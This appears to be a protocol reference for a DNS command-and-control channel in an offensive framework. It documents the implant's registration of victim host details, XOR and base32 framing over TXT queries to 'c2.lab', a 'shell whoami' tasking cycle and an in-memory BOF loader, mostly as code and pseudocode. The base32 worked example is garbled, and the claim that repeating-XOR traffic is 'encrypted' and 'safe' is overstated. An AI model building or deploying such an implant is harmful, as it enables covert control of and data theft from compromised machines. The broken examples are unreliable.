# DNS C2 Protocol Reference

## Overview

All communication between implant and listener uses DNS TXT queries + responses. Data is XOR-encrypted with a key derived from the agent ID, then base32-encoded for DNS safety.

---

## Query Format

```
QName: <chunk1>.<chunk2>.<chunk3>.<agentid>.<domain> TXT IN

Example:
MFRA.ABCD.EFGH.deadc0de.c2.lab TXT IN
```

- **agentid:** 8-character lowercase hex (e.g., "deadc0de")
- **domain:** configured in listener (e.g., "c2.lab")
- **chunks:** up to 3 × 63-character labels
  - Each chunk is base32-encoded XOR-encrypted data
  - DNS labels max 63 chars, so large frames split across multiple labels

---

## Wire Format

All frames follow this structure:

```c
struct frame {
    uint8_t msg_type;      // [0] message type
    uint8_t seq;           // [1] sequence number
    uint16_t data_len;     // [2-3] data length (LE)
    uint8_t data[N];       // [4+] payload data
}
```

**Message Types (Upstream, implant → listener):**

| Type | Name | Purpose | Data |
|------|------|---------|------|
| 0x01 | REGISTER | Agent registration | registration_payload (see below) |
| 0x02 | HEARTBEAT | Poll for tasks | empty |
| 0x03 | OUTPUT | Command output | command_output_bytes |
| 0x04 | BOF_OUTPUT | BOF execution output | bof_output_stream |

**Response Types (Downstream, listener → implant via TXT):**

| Type | Name | Purpose | Data |
|------|------|---------|------|
| 0x00 | IDLE | No tasks | empty |
| 0x01 | REG_ACK | Registration confirmed | empty |
| 0x02 | TASKS | Task commands | task_buffer (Adaptix-serialized) |
| 0x03 | CONTINUE | Chunk continuation | additional_data |

---

## Registration Payload (msg_type=0x01)

When the implant first registers, it sends this payload in the data field:

```c
struct registration_payload {
    uint8_t hostname_len;
    char hostname[hostname_len];
    uint8_t username_len;
    char username[username_len];
    uint32_t pid;                 // LE: process ID
    uint8_t arch;                 // 0x01=x64, 0x02=x86
    uint8_t os_major;             // Windows version major
    uint8_t os_minor;             // Windows version minor
    uint32_t sleep_ms;            // LE: beacon interval (ms)
    uint8_t jitter_pct;           // jitter percentage (0-100)
}
```

**Example (hex):**

```
Hostname: "TARGETHOST" (10 chars)
Username: "admin" (5 chars)
PID: 2048 (0x0800 LE)
Arch: 0x01 (x64)
OS: Windows 10 (10.0)
Sleep: 5000ms (0x88130000 LE)
Jitter: 20%

Payload bytes:
0x0A "TARGETHOST" 0x05 "admin" 0x00 0x08 0x00 0x00 0x01 0x0A 0x00 0x88 0x13 0x00 0x00 0x14
```

---

## Encryption & Encoding

### Step 1: XOR Encryption

The agent ID string is converted to bytes (hex pairs → binary):

```
AGENT_ID = "deadc0de"
XOR_KEY = [0xde, 0xad, 0xc0, 0xde]  (repeating)

plaintext = [0x01, 0x02, 0x03, ...]
ciphertext[i] = plaintext[i] XOR XOR_KEY[i % 4]
```

Example:
```
plaintext:  0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08
xor_key:    0xde 0xad 0xc0 0xde 0xde 0xad 0xc0 0xde
ciphertext: 0xdf 0xaf 0xc3 0xda 0xdb 0xab 0xc7 0xd6
```

### Step 2: Base32 Encoding

RFC 4648 base32 alphabet: [A-Z2-7] (32 characters, 5 bits per char)

```c
const char *base32_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

// Encode
for each 40-bit group (5 bytes):
  split into 8 × 5-bit values
  index into base32_alphabet
  append 8 chars
  
// Decode
for each char:
  lookup in base32_alphabet → 5 bits
  reassemble to bytes
```

Example:
```
ciphertext: 0xde, 0xad, 0xc0
binary:     11011110 10101101 11000000
5-bit:      11011 11010 10110 111 00000 (pad with zeros)
indices:    27 26 22 28 0
base32:     "BWTVA"
```

### Step 3: DNS Qname Framing

Chunks must fit in 63-character DNS labels. Split base32 output:

```
base32_encoded = "BWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVA"
chunk1 = "BWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVA" (63 chars)
chunk2 = "ABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVA" (remaining)

qname = CHUNK1.CHUNK2.AGENTID.DOMAIN
      = BWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVA.ABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVABWTVA.deadc0de.c2.lab
```

Complete DNS query:

```
QName: CHUNK1.CHUNK2.AGENTID.DOMAIN TXT IN
```

---

## Complete Example: "shell whoami"

### 1. Operator Tasks

```
GUI: Sessions → [deadc0de] → Interact
     > shell whoami
```

### 2. Server Encodes Task

```go
task := TaskData{
    CommandID: "shell",
    Args: JSON{"cmd": "whoami"},
    // ...
}

// Adapted to task buffer (Adaptix wire format)
task_buffer = marshal(task)  // [actual Adaptix encoding]
```

### 3. Listener Encodes Task Response

```go
response_frame := {
    resp_type: 0x02 (TASKS),
    data_len: len(task_buffer),
    data: task_buffer
}

// Encrypt
encrypted := XOR(response_frame, xor_key)

// Encode
base32_encoded := Base32Encode(encrypted)
```

### 4. Listener Sends in DNS Response

On next implant heartbeat, include task in TXT record:

```
Response:
    RRtype: TXT
    RRdata: "BASE32_ENCODED_TASK_BUFFER"
```

Example (short):
```
QName: EMPTY.deadc0de.c2.lab TXT IN  (heartbeat, no data)
Response: TXT "WXYZABCD..."           (base32(XOR(task)))
```

### 5. Implant Receives & Decodes

```c
// Receive DNS response
response = recvfrom(sock, buffer, ...)

// Extract TXT record value
txt_value = response.answer[0].rdata

// Decode
base32_decode(txt_value) → encrypted
decrypt = XOR(encrypted, xor_key)

// Parse frame
resp_type = decrypt[0]  // 0x02 (TASKS)
task_buffer = decrypt[4:]

// Parse task
task = parse_task(task_buffer)
// task.cmd == "shell", task.args == {"cmd": "whoami"}
```

### 6. Implant Executes

```c
// dispatch_tasks()
if (task.cmd == "shell") {
    // CreateProcess("cmd.exe /c whoami")
    // Capture output
    output = "ADMIN\TARGETHOST"
    queue_for_next_heartbeat(output)
}
```

### 7. Implant Sends Output

Next heartbeat:

```c
output_frame := {
    msg_type: 0x03 (OUTPUT),
    seq: 1,
    data_len: strlen(output),
    data: "ADMIN\TARGETHOST"
}

// Encrypt + encode
encrypted = XOR(output_frame, xor_key)
base32_encoded = Base32Encode(encrypted)

// Construct qname
qname = CHUNK1.deadc0de.c2.lab
query = DNS{ qname, TXT, IN }

sendto(sock, query, ...)
```

### 8. Listener Receives Output

```go
// Listener receives DNS query
qname = "CHUNK1.deadc0de.c2.lab"
labels = ["CHUNK1", "deadc0de", "c2", "lab"]

// Decode
data_chunks = ["CHUNK1"]
decoded = Base32Decode("CHUNK1")
decrypted = XOR(decoded, xor_key)

// Parse
msg_type = decrypted[0]  // 0x03 (OUTPUT)
output = decrypted[4:]   // "ADMIN\TARGETHOST"

// Log
Ts.TsAgentProcessData(agentId, output)
```

### 9. Console Output

```
> shell whoami
[AGENT OUTPUT]
ADMIN\TARGETHOST
```

---

## Multi-Chunk Output

Large outputs split across multiple heartbeats:

```
Output: 10KB of text
First heartbeat:  5KB (seq=1, data_len=5000)
Second heartbeat: 5KB (seq=2, data_len=5000)

Listener:
  outputBuf["deadc0de_1"] = first_5kb
  outputBuf["deadc0de_2"] = second_5kb
  When all chunks present, reassemble and log:
  Ts.TsAgentProcessData(agentId, first_5kb + second_5kb)
```

---

## BOF Protocol

### 1. Task Encodes BOF File

```go
task := TaskData{
    CommandID: "execute-bof",
    Args: {
        "file": <binary .o file>,
        "args": "arg1 arg2 ..."
    }
}
```

### 2. Implant Loads & Executes

```c
// bof_loader.c
void *bof_memory = malloc(bof_file_size)
memcpy(bof_memory, bof_data, bof_file_size)
relocate_coff(bof_memory)
resolve_imports(bof_memory, beacon_api_table)

// Call entry point
typedef int (*BOF_MAIN)(void *args, int argsize)
BOF_MAIN func = (BOF_MAIN)(bof_memory + entry_point_offset)
result = func(marshaled_args, arg_size)
```

### 3. BeaconAPI Stubs Capture Output

```c
// beacon_api.c
int BeaconPrintf(int level, char *fmt, ...) {
    va_list args
    vsnprintf(buffer, 1024, fmt, args)
    queue_output(buffer)  // Added to output queue
    return 0
}
```

### 4. Output Sent as BOF_OUTPUT

```c
output_frame := {
    msg_type: 0x04 (BOF_OUTPUT),
    seq: N,
    data: output_from_bof
}

// Encrypt + encode like normal output
```

### 5. Listener Routes to Agent

```go
if frame.msg_type == 0x04 {
    dns_agent.ProcessData(agentData, frame.data)
}

// agent/commands.go
func ProcessData(agentData, data []byte) {
    // Log with [BOF] prefix
    Ts.TsAgentConsoleOutput(agentId, MSG_BOF_OUTPUT, string(data), "", true)
}
```

---

## Size Limits

| Item | Limit | Notes |
|------|-------|-------|
| DNS label | 63 chars | RFC 1035 |
| base32 per label | ~40 bytes | 63 chars × 5 bits / 8 = 39.375 bytes |
| Frame data per query | ~120 bytes | 3 labels × 40 bytes - overhead |
| Implant → server per heartbeat | ~150 bytes | Frame header (4) + data (120+) |
| Large command output | Chunked | Multiple heartbeats, auto-reassembled |
| BOF file size | ~10MB | Limited by free heap on target |

---

## Debugging

To see encoding in action, add logging to protocol.c:

```c
// protocol.c
void debug_xor_encode(uint8_t *data, int len, uint8_t *key) {
    printf("Plaintext: ");
    for (int i = 0; i < len; i++) printf("%02x", data[i]);
    
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % KEY_LEN];
    }
    
    printf("\nCiphertext: ");
    for (int i = 0; i < len; i++) printf("%02x", data[i]);
    printf("\n");
}
```

Monitor implant output (debug build) and server logs to trace encoding/decoding.

---

## Summary

1. **Frame:** [msg_type(1) | seq(1) | len(2) | data(N)]
2. **Encrypt:** XOR with key derived from AGENT_ID
3. **Encode:** Base32 (RFC 4648)
4. **Frame DNS:** Split into 63-char labels + agentid + domain
5. **Response:** TXT record value = base32(XOR(response_frame))
6. **Reassembly:** Listener stores chunks, reconstructs on completion

All communication is DNS-based, encrypted, and safe for transmission through standard DNS resolvers.
